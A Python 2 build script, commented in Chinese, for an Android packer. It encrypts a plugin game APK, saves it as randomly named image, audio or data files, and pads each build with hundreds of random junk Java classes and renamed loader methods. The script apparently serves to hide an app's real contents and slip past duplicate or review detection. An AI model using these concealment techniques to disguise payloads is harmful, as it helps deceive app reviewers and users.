# -*- coding: UTF-8 -*-
import shutil
import os
import random
import string
import zipfile
import base64
import sys

CUR_PATH = os.getcwd()
UP_PATH = os.path.abspath(os.path.dirname(os.getcwd()))
JAVAC_PATH = CUR_PATH + "/javac_class/"
ANDROIDJAR_PATH = CUR_PATH + "/android.jar"
PROGUARD_FILEPATH = CUR_PATH + "/proguard_files/"


#-----------------需要修改配置的部分start-----------------------

#dx.bat路径
#DEXJAR_PATH = "D:/tools/adt-bundle-windows-x86_64-20131030/adt-bundle-windows-x86_64-20131030/sdk/build-tools/30.0.3"
DEXJAR_PATH = "D:/AppData/Local/Android/Sdk/build-tools/30.0.2"
#加密方式：0-AES加密 1-异或(^ int值的大小) 2-RSA（还未调通） 3-与(&)只能是0xff（在android端实现的时候有些问题，暂时未优化） 4-分割apk，将apk处理成多个图片文件
ENCTYPE_TYPE = 4
#加密密码，DES长度只能是8，AES的长度是16，使用小写字母+数字（每个包都需要更换）
ENCRYPT_PWD = "87845512"
#插件apk的application名（同个项目包不需要更换，B项目AndroidManifest.xml中的aplication）
PLUGIN_APPLICATION_NAME = "org.cocos2dx.javascript.GameApplication"
#代码包名（packagename)，比如之前是temp_class，会自动替换成需要替换的包名并进行编译（每个包都需要更换）
PACKAGENAME = "splbozin"
#类名及函数名，动态替换，以达到重构目的（每个包都需要更换）
CLASSNAME = "agucgdie"
APPLICATION_CREATE = "nssjkdn1"
APPLICATION_ATTACHBASE = "nssjkdn2"
ACTIVITY_CREATE = "nssjkdn3"
ACTIVITY_ATTACHBASE = "nssjkdn4"
#加密后的apk放置的位置，指定目录，都放在根目录下不太友好
ENCRYPT_APK_PATH = ""
#项目是u3d还是cc，两个加密后的文件后缀及文件名不一样(1:cc 2:u3d)
PROJECT_TYPE = 1


#class.jar加密后的文件名（废充，修改成自动生成）
#ENCRYPT_FILE_NAME = "test_plugin_class.bat"
#插件apk路径（废充，修改成提示输入）
#ENCRYPT_APK_NAME = "D:/rummy/cocos-creator_tools/EncryptJS/207-TeenPattiGarden.apk"

#-----------------需要修改配置的部分end-----------------------

#随机生成java文件内容
def get_java_content(packageName, fileName):
    javaContent = "package " + packageName +";"
    javaContent += "\n"
    javaContent += "public class " + fileName + " {"
    javaContent += "\n"

    #随机生成变量
    #javaContent += "private int test = 0;\n private int testB = 1;"
    spaceTypes = ["public", "private", "protected"]
    variableTypes = ["int", "String"]
    leni = random.randint(3, 10)
    for i in range(leni):
        spaceTypeI = random.randint(0, len(spaceTypes)-1)
        variableTypeI = random.randint(0, len(variableTypes)-1)
        variableStr = "    "
        variableStr += (spaceTypes[spaceTypeI] + " ")
        variableStr += (variableTypes[variableTypeI] + " ")
        variableName = ""
        lenk = random.randint(5, 10)
        for k in range(lenk):
            variableName += random.choice(string.ascii_letters)
        variableStr += (variableName + " = ")
        if variableTypes[variableTypeI] == "int":
           variableStr += str(random.randint(1, 10000))
        if variableTypes[variableTypeI] == "String":
            lenj = random.randint(5, 50)
            strContent = '"'
            for j in range(lenj):
                strContent += random.choice(string.ascii_letters)
            strContent += '"'
            variableStr += strContent
        variableStr += ";"
        variableStr += "\n"
        javaContent += variableStr
    javaContent += "\n"

    #随机生成方法
    #javaContent += "private int dqgguaol() {   return 5650;    }"
    lenMethodCount = random.randint(8, 20)
    for mc in range(lenMethodCount):
        methodReturnTypes = ["void", "int", "String", "Boolean"]
        methodReturnTypeI = random.randint(0, len(methodReturnTypes)-1)
        methodStr = "    "
        methodStr += (spaceTypes[spaceTypeI] + " ")
        methodStr += (methodReturnTypes[methodReturnTypeI] + " ")
        methodName = ""
        lenMN = random.randint(4, 10)
        for mn in range(lenMN):
            methodName += random.choice(string.ascii_letters)
        methodName = methodName.lower()
        methodStr += methodName
        methodStr += "() {"
        methodStr += "   "
        if methodReturnTypes[methodReturnTypeI] == "int":
            methodStr += "return "
            methodStr += str(random.randint(0, 9999))
        if methodReturnTypes[methodReturnTypeI] == "String":
            methodStr += "return "
            methodStrI = random.randint(5, 50)
            mstrContent = '"'
            for strI in range(methodStrI):
                mstrContent += random.choice(string.ascii_letters)
            mstrContent += '"'
            methodStr += mstrContent
        if methodReturnTypes[methodReturnTypeI] == "Boolean":
            methodStr += "return "
            boolI = random.randint(0, 1)
            if boolI == 0:
                methodStr += "true"
            else:
                methodStr += "false"
        methodStr += ";"
        methodStr += "    }"
        javaContent += methodStr
        javaContent += "\n"

    javaContent += "\n}"
    return javaContent

#随机创建文件及往文件中随机填入内容
def random_java_file():
    global create_java_files_path
    global java_packkge_name
    #随机创建15-50个文件，文件名首字每大写，文件名长度为5-10个字符
    leni = random.randint(100, 1000)
    for i in range(leni):
        fileName = ""
        lenj = random.randint(5, 10)
        for j in range(lenj):
            fileName += random.choice(string.ascii_letters)
        fileName = fileName.lower().capitalize()
        rootDir = JAVAC_PATH + PACKAGENAME + "/" + fileName + ".java"
        #print(rootDir)
        f = open(rootDir,'w+')
        fileContent = get_java_content(PACKAGENAME, fileName)
        #print fileContent
        f.write(fileContent)
        f.seek(0)
        read = f.readline()
        f.close()

def deleteDir(delete_path):
    if not os.path.exists(delete_path):
        return
    src_dir = os.listdir(delete_path)
    for file in src_dir:
        filePath = delete_path + file
        if os.path.exists(filePath):
            if not (os.path.isdir(filePath)):
                os.remove(filePath)
            else:
                shutil.rmtree(filePath)
        else:
            print "no filepath"

def copyJavaFiles():	
    #创建javac_class
    if not os.path.exists(JAVAC_PATH):  #创建java_class文件夹
        os.makedirs(JAVAC_PATH)
    packagepath = JAVAC_PATH + PACKAGENAME
    if not os.path.exists(packagepath):  #创建package文件夹
        os.makedirs(packagepath)  
    binPath = packagepath + "/bin"
    if not os.path.exists(binPath): #创建bin文件夹，存在编译后的文件
        os.makedirs(binPath)
    copy_files(CUR_PATH+"/temp_class", packagepath) #将模板中的java文件拷贝至这个文件夹下
    #随机生成java文件，用于混淆
    random_java_file()
    #编译java文件
    cmd = ('javac -encoding utf-8 -target 1.8 -bootclasspath ' + ANDROIDJAR_PATH + ' -d ' + binPath + ' ' + packagepath + '\*.java')
    os.system(cmd) 
    #将编译后的class文件压缩成一个jar包
    classjarpath = (JAVAC_PATH + "class.jar")
    outjarpath = (JAVAC_PATH + 'out.jar')
    zipDir(binPath, classjarpath)
    #将编译后的class.jar包进行dex格式化
    cmd = (DEXJAR_PATH + '/dx.bat --dex --output=' + outjarpath + " " + classjarpath)
    os.system(cmd) 
    #对格式化后的out.jar进行加密
    encryptjarpath = JAVAC_PATH + getFileName()
    if ENCTYPE_TYPE == 1:
        cmd = ('java FileYHEncrypt' + ' ' + ENCRYPT_PWD + " " + outjarpath + " " + encryptjarpath)
        os.system(cmd)
    elif ENCTYPE_TYPE == 4:
        #为4时，是把apk分割
        cmd = ('java FileYHEncrypt' + ' ' + ENCRYPT_PWD + " " + outjarpath + " " + encryptjarpath)
        os.system(cmd)
    elif ENCTYPE_TYPE == 2:
        cmd = ('java RSAEncrypt' + " " + outjarpath + " " + encryptjarpath)
        os.system(cmd)
    elif ENCTYPE_TYPE == 3:
        cmd = ('java FileYuEncrypt' + ' ' + ENCRYPT_PWD + " " + outjarpath + " " + encryptjarpath)
        os.system(cmd)
    else:
        cmd = ('java EncryptTools_AES' + ' ' + ENCRYPT_PWD + " " + outjarpath + " " + encryptjarpath)
        os.system(cmd)
   
def javacFiles():
    cmd = ('javac -encoding utf-8 -target 1.8 EncryptTools_AES.java')
    os.system(cmd)
    cmd = ('javac -encoding utf-8 -target 1.8 FileYHEncrypt.java')
    os.system(cmd) 
    cmd = ('javac -encoding utf-8 -target 1.8 RSAEncrypt.java')
    os.system(cmd)
    cmd = ('javac -encoding utf-8 -target 1.8 FileYuEncrypt.java')
    os.system(cmd) 
    cmd = ('javac -encoding utf-8 -target 1.8 FileSplitEncrypt.java')
    os.system(cmd) 

def getCCFileName():
    suffixList_cc = ['.png', '.jpg', '.mp3']
    fileName = ""
    for j in range(8):
        fileName += random.choice(string.ascii_lowercase + string.digits)
    fileName += '-' 
    for j in range(4):
        fileName += random.choice(string.ascii_lowercase + string.digits)
    fileName += '-' 
    for j in range(4):
        fileName += random.choice(string.ascii_lowercase + string.digits)
    fileName += '-' 
    for j in range(4):
        fileName += random.choice(string.ascii_lowercase + string.digits)
    fileName += '-' 
    for j in range(12):
        fileName += random.choice(string.ascii_lowercase + string.digits)
    suffix = suffixList_cc[random.randint(0, len(suffixList_cc)-1)]
    return fileName+suffix

def getU3DFileName():
    suffixList_u3d = ['.dat', '.data']
    fileName = ""
    lenj = random.randint(5, 15)
    for j in range(lenj):
        fileName += random.choice(string.ascii_letters)
    suffix = suffixList_u3d[random.randint(0, len(suffixList_u3d)-1)]
    return fileName+suffix
	
def getFileName():
    #suffixList = ['', '.mp3', '.png', '.js', '.lua', '.jpg', '.so', ".mp4", ".bat", ".data", ".db", ".avi", ".doc", ".exe", ".wav", ".gif", ".dat"]
    if PROJECT_TYPE == 1:
        return getCCFileName()
    else:
        return getU3DFileName()

    
def zipDir(dirpath,outFullName):
    zip = zipfile.ZipFile(outFullName,"w",zipfile.ZIP_DEFLATED)
    for path,dirnames,filenames in os.walk(dirpath):
        # 去掉目标跟路径，只对目标文件夹下边的文件及文件夹进行压缩
        fpath = path.replace(dirpath,'')
        for filename in filenames:
            zip.write(os.path.join(path,filename),os.path.join(fpath,filename))
    zip.close()

def replace_content(file,old_str,new_str):
    file_data = ""
    with open(file, "r") as f:
        for line in f:
            if old_str in line:
                line = line.replace(old_str,new_str)
            file_data += line
    with open(file,"w") as f:
        f.write(file_data)

def copy_files(oriPath,target):
    #先将apk加密
    apkName = getFileName()
    enctyptApkPath = JAVAC_PATH + apkName
    ENCRYPT_APK_NAME = raw_input(u'input encrypt apk path:'.encode('gb18030')).decode(sys.stdin.encoding or locale.getpreferredencoding(True))
    if ENCTYPE_TYPE == 1:
        cmd = ('java FileYHEncrypt' + ' ' + ENCRYPT_PWD + " " + ENCRYPT_APK_NAME + " " + enctyptApkPath)
        os.system(cmd)
    elif ENCTYPE_TYPE == 2:
        cmd = ('java RSAEncrypt' + " " + ENCRYPT_APK_NAME + " " + enctyptApkPath)
        os.system(cmd)
    elif ENCTYPE_TYPE == 3:
        cmd = ('java FileYuEncrypt' + ' ' + ENCRYPT_PWD + " " + ENCRYPT_APK_NAME + " " + enctyptApkPath)
        os.system(cmd)
    elif ENCTYPE_TYPE == 4:
        cmd = ('java FileSplitEncrypt' + ' ' + ENCRYPT_APK_NAME + " " + ENCRYPT_PWD + " " + str(PROJECT_TYPE))
        os.system(cmd)
    else:
        cmd = ('java EncryptTools_AES' + ' ' + ENCRYPT_PWD + " " + ENCRYPT_APK_NAME + " " + enctyptApkPath)
        os.system(cmd)
    #cmd = ('java EncryptTools_AES' + ' ' + ENCRYPT_PWD + " " + ENCRYPT_APK_NAME + " " + enctyptApkPath)
    #os.system(cmd)
    split_file_content = ""
    with open('file_split_rote.txt', 'r') as f:   split_file_content = f.read()
	
    if not (os.path.isdir(oriPath) and os.path.isdir(target)):
        return
    for a in os.walk(oriPath):
        for d in a[1]:
            dir_path = os.path.join(a[0].replace(oriPath,target),d)
            if not os.path.isdir(dir_path):
                os.makedirs(dir_path)
        for f in a[2]:
            dep_path = os.path.join(a[0],f)
            if(f == "PluginHelper.java"):
                f = (CLASSNAME + ".java")
            arr_path = os.path.join(a[0].replace(oriPath,target),f)
            shutil.copy(dep_path,arr_path)
            replace_content(arr_path, "temp_class", PACKAGENAME)
            if(f == (CLASSNAME + ".java")):
                replace_content(arr_path, "PluginHelper", CLASSNAME)
                replace_content(arr_path, "application_oncreate", APPLICATION_CREATE)
                replace_content(arr_path, "application_attachbasecontext", APPLICATION_ATTACHBASE)
                replace_content(arr_path, "activity_attachbasecontext", ACTIVITY_ATTACHBASE)
                replace_content(arr_path, "activity_oncreate", ACTIVITY_CREATE)
            if(f == "Config.java"):
                replace_content(arr_path, "temp_plugin_application_name", PLUGIN_APPLICATION_NAME)
                replace_content(arr_path, "temp_plugin_apk_name", apkName)
                replace_content(arr_path, "temp_encrypt_apk_path", ENCRYPT_APK_PATH)
                replace_content(arr_path, "temp_split_path", split_file_content)
                replace_content(arr_path, "temp_encrypt_apk_type", str(ENCTYPE_TYPE))
            if(f == "Utils.java"):
                replace_content(arr_path, "temp_encrypt_password", ENCRYPT_PWD)
				
def createProguardFiles():
    #创建混淆文件
    fileLen = random.randint(50, 100)
    for i in range(fileLen):
        guardFileName = getFileName()
        fileContentLength = random.randint(1000, 30000)
        fileContent = ""
        for j in range(fileContentLength):
            fileContent + "/n"
            fileContent += random.choice(string.ascii_letters)
        proguard_file = open(PROGUARD_FILEPATH + guardFileName, 'w')
        proguard_file.write(fileContent)
        proguard_file.close()

if __name__ == '__main__':
    deleteDir(JAVAC_PATH)
    deleteDir(CUR_PATH + "/splitFile/")
    if not os.path.exists(CUR_PATH + "/splitFile/"):  #创建java_class文件夹
        os.makedirs(CUR_PATH + "/splitFile/")
    javacFiles()
    copyJavaFiles()
    #deleteDir(PROGUARD_FILEPATH)
    #createProguardFiles()
